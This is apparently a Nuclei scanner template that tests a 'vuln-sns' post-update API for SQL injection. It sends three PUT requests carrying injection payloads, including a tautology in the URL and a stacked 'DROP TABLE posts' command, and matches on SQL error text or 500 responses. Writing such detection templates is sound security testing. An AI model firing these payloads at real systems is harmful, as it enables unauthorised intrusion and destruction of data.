id: vuln-sns-posts-put-sql-injection

info:
  name: vuln-sns Posts PUT SQL Injection
  author: devin
  severity: high
  description: SQL injection vulnerability in post update endpoint due to unsafe string concatenation
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-89
  metadata:
    max-request: 3
  tags: sqli,posts,put,vuln-sns,authenticated

http:
  - method: PUT
    path:
      - "{{BaseURL}}/api/posts/1"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer alice_token"
    
    body: |
      {
        "content": "test' AND (SELECT COUNT(*) FROM users) > 0 -- "
      }
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "SQL syntax"
          - "near"
        condition: or
        part: body
        case-insensitive: true
      
      - type: status
        status:
          - 500

  - method: PUT
    path:
      - "{{BaseURL}}/api/posts/1' OR '1'='1"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer alice_token"
    
    body: |
      {
        "content": "updated content"
      }
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "SQL syntax"
        condition: or
        part: body
        case-insensitive: true
      
      - type: status
        status:
          - 500

  - method: PUT
    path:
      - "{{BaseURL}}/api/posts/999999"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer alice_token"
    
    body: |
      {
        "content": "test'; DROP TABLE posts; -- "
      }
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "drop"
          - "table"
        condition: or
        part: body
        case-insensitive: true
      
      - type: status
        status:
          - 500
